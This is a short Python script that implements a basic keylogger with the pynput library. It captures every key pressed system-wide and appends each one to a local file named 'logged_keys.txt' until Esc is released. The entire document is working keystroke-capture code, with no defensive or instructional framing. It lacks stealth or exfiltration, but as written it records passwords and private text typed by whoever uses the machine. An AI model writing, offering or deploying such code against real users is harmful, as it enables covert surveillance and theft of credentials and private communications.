import pynput
from pynput.keyboard import Key, Listener

# Define the file where the logs will be stored
log_file = "logged_keys.txt"

# Function to write keystrokes to the file
def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

def on_press(key):
    try:
        write_to_file(key.char)  # For alphabetical keys
    except AttributeError:
        write_to_file(key)  # For special keys

def on_release(key):
    if key == Key.esc:  # Stop listener when escape key is pressed
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
